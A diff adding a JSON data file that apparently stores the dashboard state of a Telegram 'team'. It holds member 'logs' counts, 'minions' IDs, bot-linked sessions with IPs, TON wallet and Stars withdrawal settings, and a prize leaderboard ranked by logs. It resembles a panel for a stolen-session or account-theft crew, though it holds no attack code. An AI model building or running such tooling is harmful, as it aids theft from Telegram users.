@@ -1,0 +1,116 @@
+{
+  "user": {
+    "username": "slrzQ",
+    "userId": "620771081",
+    "tag": "#р",
+    "logsCount": 48,
+    "daysInTeam": 24,
+    "tonWallet": "",
+    "tonBalance": 0,
+    "tonWithdrawn": 0
+  },
+  "minions": [
+    "8100791171",
+    "8321020721",
+    "8058235111",
+    "5227767831"
+  ],
+  "stars": {
+    "postUrl": "https://t.me/slarzio/2",
+    "withdrawStars": false,
+    "howWithdraw": "all"
+  },
+  "config": {
+    "extraLog": true,
+    "apiId": "",
+    "apiHash": ""
+  },
+  "logsChat": {
+    "chatId": "",
+    "threadId": ""
+  },
+  "sessions": [
+    {
+      "id": 1,
+      "bot": "@X9aurorabot",
+      "sessionName": "Сессия #1",
+      "location": "NL, Amsterdam",
+      "os": "iOS 18.7",
+      "ip": "213.111.139.195",
+      "ping": 40,
+      "status": "online"
+    },
+    {
+      "id": 2,
+      "bot": "@alprozalameilfitness",
+      "sessionName": "Сессия #2",
+      "location": "US, Ashburn",
+      "os": "iOS 18.7",
+      "ip": "195.181.173.212",
+      "ping": 34,
+      "status": "online"
+    },
+    {
+      "id": 3,
+      "bot": "@slarz_bot",
+      "sessionName": "Сессия #3",
+      "location": "DE, Frankfurt",
+      "os": "Android 14",
+      "ip": "188.114.97.12",
+      "ping": 31,
+      "status": "online"
+    }
+  ],
+  "contest": {
+    "title": "$25,000 ПРИЗОВОЙ ФОНД",
+    "endTime": 1787304616716,
+    "leaderboard": [
+      {
+        "rank": 1,
+        "name": "@cryptoking",
+        "logs": 342,
+        "prize": "$10,000",
+        "badge": "gold"
+      },
+      {
+        "rank": 2,
+        "name": "@dark_venom",
+        "logs": 289,
+        "prize": "$6,000",
+        "badge": "silver"
+      },
+      {
+        "rank": 3,
+        "name": "@aurora_boss",
+        "logs": 215,
+        "prize": "$3,500",
+        "badge": "bronze"
+      },
+      {
+        "rank": 4,
+        "name": "@phantom_x",
+        "logs": 180,
+        "prize": "$2,000"
+      },
+      {
+        "rank": 5,
+        "name": "@cyber_ninja",
+        "logs": 134,
+        "prize": "$1,500"
+      },
+      {
+        "rank": 6,
+        "name": "@storm_worker",
+        "logs": 92,
+        "prize": "$1,000"
+      },
+      {
+        "rank": 7,
+        "name": "@slrzQ (Вы)",
+        "logs": 48,
+        "prize": "$500",
+        "isSelf": true
+      }
+    ]
+  }
+}
